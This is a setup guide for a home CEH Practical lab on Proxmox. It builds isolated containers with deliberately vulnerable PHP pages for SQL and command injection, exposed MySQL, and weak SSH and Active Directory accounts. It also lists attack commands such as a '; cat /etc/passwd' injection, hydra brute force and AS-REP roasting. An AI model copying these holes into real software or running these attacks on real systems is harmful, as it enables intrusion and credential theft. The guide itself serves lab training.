# CEH Practical CTF Lab — Proxmox Setup  
  
## Hardware Constraints  
- Free RAM: ~3GB (5GB if Minecraft stopped)  
- Free NVMe: ~230GB  
- Strategy: **stop Minecraft LXC** during practice, use LXC over VMs where possible, attacker machine = your desktop (not Proxmox)  
  
## Architecture  
  
```  
Your Desktop (Parrot/Kali/Fedora)     ← ATTACKER (no Proxmox resources needed)  
        │  
        └── Proxmox Bridge (vmbr0 or dedicated vmbr1)  
                │  
                ├── LXC 110: "web-target" (512MB) — DVWA + WordPress + FTP + MySQL  
                ├── LXC 111: "linux-target" (256MB) — SSH, SNMP, NFS, SMTP, weak users  
                ├── LXC 112: "ad-target" (2GB) — Samba AD DC + MSSQL (if Minecraft stopped)  
                └── CT/VM 113: "steg-crypto" (256MB) — file server with steg/crypto challenges  
```  
  
Total RAM needed: ~3GB (or 1GB without AD target)  
  
---  
  
## Step 0: Network Setup  
  
Create an isolated network for the lab so you don't accidentally attack your real services:  
  
```bash  
# On Proxmox, add a new bridge (no physical interface = isolated)  
# Edit /etc/network/interfaces, add:  
  
auto vmbr1  
iface vmbr1 inet static  
    address 10.10.55.1/24  
    bridge-ports none  
    bridge-stp off  
    bridge-fd 0  
    post-up echo 1 > /proc/sys/net/ipv4/ip_forward  
    post-up iptables -t nat -A POSTMASQUERADE -s 10.10.55.0/24 -o vmbr0 -j MASQUERADE  
    post-down iptables -t nat -D POSTMASQUERADE -s 10.10.55.0/24 -o vmbr0 -j MASQUERADE  
```  
  
Then `ifreload -a` or reboot. All lab containers use vmbr1 with static IPs in 10.10.55.0/24.  
  
Your desktop gets a static route or additional NIC on this subnet.  
  
---  
  
## Step 1: LXC 110 — Web Target (512MB RAM)  
  
**Purpose:** SQLi, command injection, WordPress, web server scanning, FTP, MySQL  
**IP:** 10.10.55.10  
  
```bash  
# Create Debian 12 LXC  
pct create 110 local:vztmpl/debian-12-standard_12.7-1_amd64.tar.zst \  
  --hostname web-target \  
  --memory 512 --cores 1 \  
  --net0 name=eth0,bridge=vmbr1,ip=10.10.55.10/24,gw=10.10.55.1 \  
  --rootfs local:8 \  
  --unprivileged 1 --features nesting=1  
  
pct start 110  
pct enter 110  
```  
  
Inside the container:  
```bash  
apt update && apt install -y apache2 mariadb-server php php-mysqli php-gd \  
  libapache2-mod-php vsftpd git unzip wget curl  
  
# --- DVWA ---  
cd /var/www/html  
git clone https://github.com/digininja/DVWA.git dvwa  
cp dvwa/config/config.inc.php.dist dvwa/config/config.inc.php  
# Edit config: set db_password, set default_security_level to 'low'  
sed -i "s/p@ssw0rd/dvwapass/" dvwa/config/config.inc.php  
sed -i "s/'impossible'/'low'/" dvwa/config/config.inc.php  
chown -R www-data:www-data dvwa  
  
# Setup MySQL  
mysql -e "CREATE DATABASE dvwa; CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'dvwapass'; GRANT ALL ON dvwa.* TO 'dvwa'@'localhost'; FLUSH PRIVILEGES;"  
  
# Allow PHP functions needed for command injection  
sed -i 's/allow_url_include = Off/allow_url_include = On/' /etc/php/*/apache2/php.ini  
systemctl restart apache2  
  
# --- WordPress ---  
cd /var/www/html  
wget https://wordpress.org/latest.tar.gz && tar xzf latest.tar.gz && rm latest.tar.gz  
mysql -e "CREATE DATABASE wordpress; CREATE USER 'wpuser'@'localhost' IDENTIFIED BY 'wppass123'; GRANT ALL ON wordpress.* TO 'wpuser'@'localhost'; FLUSH PRIVILEGES;"  
cp wordpress/wp-config-sample.php wordpress/wp-config.php  
sed -i "s/database_name_here/wordpress/" wordpress/wp-config.php  
sed -i "s/username_here/wpuser/" wordpress/wp-config.php  
sed -i "s/password_here/wppass123/" wordpress/wp-config.php  
chown -R www-data:www-data wordpress  
  
# Apache config for both  
cat > /etc/apache2/sites-available/000-default.conf << 'CONF'  
<VirtualHost *:80>  
    DocumentRoot /var/www/html  
    <Directory /var/www/html>  
        AllowOverride All  
    </Directory>  
</VirtualHost>  
CONF  
a2enmod rewrite && systemctl restart apache2  
  
# --- FTP with weak creds ---  
useradd -m ftpuser && echo "ftpuser:hunter2" | chpasswd  
useradd -m admin && echo "admin:password123" | chpasswd  
# Create flag files  
echo "FLAG{ftp_anonymous_access}" > /var/ftp/pub/flag.txt  
echo "FLAG{ftpuser_password_is_hunter2}" > /home/ftpuser/secret.txt  
  
# Enable anonymous FTP  
sed -i 's/anonymous_enable=NO/anonymous_enable=YES/' /etc/vsftpd.conf  
echo "anon_root=/var/ftp/pub" >> /etc/vsftpd.conf  
mkdir -p /var/ftp/pub && chmod 755 /var/ftp/pub  
systemctl restart vsftpd  
  
# --- MySQL exposed (for SQLMap practice) ---  
sed -i 's/bind-address.*=.*/bind-address = 0.0.0.0/' /etc/mysql/mariadb.conf.d/50-server.cnf  
mysql -e "CREATE USER 'root'@'%' IDENTIFIED BY 'toor'; GRANT ALL ON *.* TO 'root'@'%'; FLUSH PRIVILEGES;"  
systemctl restart mariadb  
  
# --- Create vulnerable web page for SQLi ---  
cat > /var/www/html/sqli.php << 'PHP'  
<?php  
$conn = new mysqli("localhost", "dvwa", "dvwapass", "dvwa");  
$id = $_GET['id'] ?? '1';  
$result = $conn->query("SELECT * FROM users WHERE user_id = '$id'");  
echo "<h1>User Lookup</h1>";  
if ($result && $row = $result->fetch_assoc()) {  
    echo "User: " . $row['user'] . "<br>Name: " . $row['first_name'] . " " . $row['last_name'];  
} else {  
    echo "No user found";  
}  
?>  
PHP  
chown www-data:www-data /var/www/html/sqli.php  
  
# --- Create vulnerable page for Command Injection ---  
cat > /var/www/html/cmd.php << 'PHP'  
<?php  
if (isset($_GET['ip'])) {  
    $ip = $_GET['ip'];  
    echo "<pre>" . shell_exec("ping -c 2 " . $ip) . "</pre>";  
}  
?>  
<form method="GET">  
IP: <input name="ip" value="127.0.0.1"> <input type="submit" value="Ping">  
</form>  
PHP  
chown www-data:www-data /var/www/html/cmd.php  
```  
  
### CTF Flags for Web Target:  
1. `http://10.10.55.10/dvwa` — login admin/password, practice SQLi, command injection, XSS  
2. `http://10.10.55.10/sqli.php?id=1` — SQLMap target: `sqlmap -u "http://10.10.55.10/sqli.php?id=1" --dbs`  
3. `http://10.10.55.10/cmd.php` — command injection: `; cat /etc/passwd`  
4. `http://10.10.55.10/wordpress` — WPScan target  
5. FTP anonymous → flag.txt  
6. FTP brute force ftpuser → secret.txt  
  
---  
  
## Step 2: LXC 111 — Linux Target (256MB RAM)  
  
**Purpose:** SSH brute force, SNMP enum, NFS shares, SMTP enum, hash cracking  
**IP:** 10.10.55.11  
  
```bash  
pct create 111 local:vztmpl/debian-12-standard_12.7-1_amd64.tar.zst \  
  --hostname linux-target \  
  --memory 256 --cores 1 \  
  --net0 name=eth0,bridge=vmbr1,ip=10.10.55.11/24,gw=10.10.55.1 \  
  --rootfs local:4 \  
  --unprivileged 0  
  
pct start 111  
pct enter 111  
```  
  
Inside:  
```bash  
apt update && apt install -y openssh-server snmpd snmp nfs-kernel-server \  
  postfix net-tools  
  
# --- Weak SSH users ---  
useradd -m alice && echo "alice:cupcake" | chpasswd  
useradd -m bob && echo "bob:batman" | chpasswd  
useradd -m admin && echo "admin:password1" | chpasswd  
useradd -m joshua && echo "joshua:cupcake" | chpasswd  
useradd -m mark && echo "mark:cupcake" | chpasswd  
  
# Create flags  
echo "FLAG{ssh_brute_force_alice_cupcake}" > /home/alice/flag.txt  
echo "FLAG{you_found_the_shadow}" > /root/root_flag.txt  
chmod 600 /root/root_flag.txt  
  
# --- SNMP with public community string ---  
cat > /etc/snmp/snmpd.conf << 'SNMP'  
rocommunity public  
syslocation "Server Room, Floor 3"  
syscontact admin@target.com  
SNMP  
systemctl restart snmpd  
  
# --- NFS export ---  
mkdir -p /srv/nfs/shared  
echo "FLAG{nfs_share_exposed}" > /srv/nfs/shared/confidential.txt  
echo "/srv/nfs/shared *(rw,sync,no_subtree_check,no_root_squash)" > /etc/exports  
exportfs -ra  
  
# --- Hash file for cracking practice ---  
# Create a file with hashes to crack  
cat > /home/alice/hashes.txt << 'HASHES'  
admin:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
alice:1001:aad3b435b51404eeaad3b435b51404ee:a4f49c406510bdcab6824ee7c30fd852:::  
bob:1002:aad3b435b51404eeaad3b435b51404ee:e09ab7e1de56ffe3fbb10d10e1da6542:::  
HASHES  
  
# --- SMTP ---  
# Postfix is installed, add users that can be enumerated  
systemctl start postfix  
```  
  
### CTF Flags:  
1. SSH brute force: `hydra -l alice -P rockyou.txt 10.10.55.11 ssh` → password is "cupcake"  
2. SNMP enum: `snmpwalk -v2c -c public 10.10.55.11` → find system info  
3. NFS: `showmount -e 10.10.55.11` → mount → read confidential.txt  
4. SMTP: `smtp-user-enum -M VRFY -U users.txt -t 10.10.55.11` → find valid users  
5. Hash cracking: crack NTLM hashes in /home/alice/hashes.txt  
  
---  
  
## Step 3: LXC 112 — AD Target (2GB RAM) — STOP MINECRAFT FIRST  
  
**Purpose:** Domain Controller, Kerberoasting, AS-REP, MSSQL, LDAP enum  
**IP:** 10.10.55.22  
  
> Only run this when practicing AD attacks. `pct stop 101` (Minecraft) first.  
  
```bash  
pct create 112 local:vztmpl/debian-12-standard_12.7-1_amd64.tar.zst \  
  --hostname ad-target \  
  --memory 2048 --cores 2 \  
  --net0 name=eth0,bridge=vmbr1,ip=10.10.55.22/24,gw=10.10.55.1 \  
  --rootfs local:15 \  
  --unprivileged 0 --features nesting=1  
  
pct start 112  
pct enter 112  
```  
  
Inside:  
```bash  
apt update && apt install -y samba krb5-kdc krb5-admin-server winbind \  
  smbclient ldap-utils  
  
# --- Setup Samba as AD DC ---  
rm /etc/samba/smb.conf  
  
samba-tool domain provision \  
  --realm=CEH.COM \  
  --domain=CEH \  
  --server-role=dc \  
  --dns-backend=SAMBA_INTERNAL \  
  --adminpass='Pa$$w0rd'  
  
# Copy Kerberos config  
cp /var/lib/samba/private/krb5.conf /etc/krb5.conf  
  
# Start Samba AD DC  
systemctl stop smbd nmbd winbind 2>/dev/null  
samba  
  
# --- Create AD Users ---  
samba-tool user create Joshua cupcake --given-name=Joshua  
samba-tool user create Mark cupcake --given-name=Mark  
samba-tool user create SQL_srv batman --given-name=SQL  
samba-tool user create DC-Admin 'advanced!' --given-name=DC  
  
# Set Joshua as AS-REP roastable (no preauth required)  
samba-tool user set-password Joshua --newpassword=cupcake  
samba-tool user setexpiry Joshua --noexpiry  
# Disable preauth for Joshua  
samba-tool user add --use-username-as-cn Joshua 2>/dev/null  
ldapmodify -H ldap://localhost -D "CN=Administrator,CN=Users,DC=CEH,DC=COM" -w 'Pa$$w0rd' << 'LDIF'  
dn: CN=Joshua,CN=Users,DC=CEH,DC=COM  
changetype: modify  
replace: userAccountControl  
userAccountControl: 4194304  
LDIF  
  
# Add DC-Admin to Domain Admins  
samba-tool group addmembers "Domain Admins" DC-Admin  
  
# --- LDAP is automatically running on port 389 ---  
# --- Kerberos on port 88 ---  
  
# --- SMB Shares ---  
mkdir -p /srv/samba/shared  
echo "FLAG{ad_domain_compromised}" > /srv/samba/shared/domain_flag.txt  
cat >> /etc/samba/smb.conf << 'SMB'  
  
[shared]  
    path = /srv/samba/shared  
    read only = no  
    guest ok = yes  
SMB  
```  
  
> Note: Full Samba AD DC is heavy. If it doesn't fit, skip this container and just practice AD concepts on the EC-Council lab. The other 3 containers cover 80% of the exam.  
  
### CTF Flags:  
1. Identify DC: `nmap -p 88,389,445 10.10.55.22`  
2. LDAP enum: `ldapsearch -x -h 10.10.55.22 -b "dc=CEH,dc=COM"`  
3. AS-REP Roast Joshua: `GetNPUsers.py CEH.COM/ -no-pass -usersfile users.txt -dc-ip 10.10.55.22`  
4. Crack Joshua's hash → password is "cupcake"  
5. Password spray: `cme smb 10.10.55.0/24 -u users.txt -p cupcake`  
6. SMB enum: `enum4linux -a 10.10.55.22`  
  
---  
  
## Step 4: Steg + Crypto Challenge Files (256MB LXC or just a shared folder)  
  
**Purpose:** Steganography and cryptography challenges  
**IP:** 10.10.55.13 (or just use NFS/SMB share from another container)  
  
Simplest approach — create challenge files on your desktop:  
  
```bash  
mkdir -p ~/ceh-ctf/steg-crypto && cd ~/ceh-ctf/steg-crypto  
  
# --- Steganography Challenges ---  
  
# 1. Steghide (JPEG)  
apt install steghide  
echo "FLAG{steghide_hidden_message}" > secret.txt  
steghide embed -cf sample.jpg -ef secret.txt -p "password123"  
# Exam task: "Find the hidden message in sample.jpg"  
# Answer: steghide extract -sf sample.jpg -p password123  
  
# 2. Snow (whitespace steganography)  
apt install stegsnow  
snow -C -m "FLAG{snow_whitespace_secret}" -p "letmein" cover.txt stego.txt  
# Exam task: "Extract hidden text from stego.txt"  
# Answer: snow -C -p "letmein" stego.txt  
  
# 3. OpenStego  
# Create via OpenStego GUI: embed secret.txt into image with password "test"  
  
# --- Crypto Challenges ---  
  
# 4. Hash comparison (find tampered file)  
echo "original content file 1" > file1.txt  
echo "original content file 2" > file2.txt  
echo "TAMPERED content file 3" > file3.txt  
echo "original content file 4" > file4.txt  
# Exam task: "Which file was tampered?"  
# Answer: md5sum file*.txt → file3 has different hash  
  
# 5. Hash cracking challenge  
echo '5f4dcc3b5aa765d61d8327deb882cf99' > crack_this.txt  
# Exam task: "Crack this MD5 hash"  
# Answer: hashcat -m 0 crack_this.txt rockyou.txt → "password"  
  
echo '21232f297a57a5a743894a0e4a801fc3' > crack_this2.txt  
# Answer: "admin"  
  
# 6. VeraCrypt volume  
# Create a small VeraCrypt volume via GUI, put FLAG{veracrypt_decrypted} inside  
# Password: "exampass"  
# Exam task: "Mount the VeraCrypt volume and find the flag"  
  
# 7. File with hidden data (binwalk)  
cat sample.jpg secret_archive.zip > suspicious.jpg  
# Exam task: "What's hidden in suspicious.jpg?"  
# Answer: binwalk -e suspicious.jpg  
```  
  
---  
  
## Step 5: Wireshark Challenge (no VM needed)  
  
Create .pcap files for practice on your desktop:  
  
```bash  
# Generate sample traffic to capture  
# Terminal 1:  
tcpdump -i any -w ftp_capture.pcap port 21 &  
  
# Terminal 2: (generates FTP login traffic)  
# Connect to your FTP target and login  
  
# Exam task: "Find the FTP password in ftp_capture.pcap"  
# Answer: Open in Wireshark → filter: ftp.request.command == "PASS"  
```  
  
Or download practice pcaps:  
- https://wiki.wireshark.org/SampleCaptures  
- Search "CTF pcap challenges"  
  
---  
  
## Quick Start / Stop Scripts  
  
```bash  
# start-ceh-lab.sh  
#!/bin/bash  
echo "Stopping Minecraft..."  
pct stop 101  
sleep 2  
echo "Starting CEH Lab..."  
pct start 110  # web target  
pct start 111  # linux target  
pct start 112  # AD target  
echo "Lab ready! Targets: 10.10.55.10, 10.10.55.11, 10.10.55.22"  
```  
  
```bash  
# stop-ceh-lab.sh  
#!/bin/bash  
echo "Stopping CEH Lab..."  
pct stop 110  
pct stop 111  
pct stop 112  
echo "Starting Minecraft..."  
pct start 101  
echo "Done!"  
```  
  
---  
  
## CTF Flag Checklist — Practice Until All Found  
  
### Web (10.10.55.10)  
- [ ] SQLMap: find database names via sqli.php  
- [ ] SQLMap: dump DVWA users table  
- [ ] Command injection: read /etc/passwd via cmd.php  
- [ ] WPScan: enumerate WordPress users  
- [ ] WPScan: brute force WordPress login  
- [ ] Nikto: identify web server version  
- [ ] dirb: find hidden directories  
- [ ] FTP anonymous: retrieve flag.txt  
- [ ] FTP brute force: get ftpuser's secret.txt  
  
### Linux (10.10.55.11)  
- [ ] Hydra SSH: crack alice's password  
- [ ] SNMP: enumerate system info with snmpwalk  
- [ ] NFS: mount share, read confidential.txt  
- [ ] SMTP: enumerate valid users  
- [ ] Hash cracking: crack NTLM hashes from hashes.txt  
  
### AD (10.10.55.22)  
- [ ] Nmap: identify as Domain Controller (port 88+389)  
- [ ] LDAP: enumerate domain users  
- [ ] AS-REP Roast: get Joshua's hash and crack it  
- [ ] Password spray: find other users with "cupcake"  
- [ ] SMB: enumerate shares and users  
  
### Steg/Crypto (local files)  
- [ ] Steghide: extract from JPEG  
- [ ] Snow: extract from text file  
- [ ] binwalk: extract embedded file  
- [ ] Hash comparison: find tampered file  
- [ ] MD5 cracking  
- [ ] VeraCrypt: mount and read contents  
  
### Wireshark (local pcap)  
- [ ] Find FTP credentials in pcap  
- [ ] Identify scanning activity  
- [ ] Follow TCP stream to extract data  
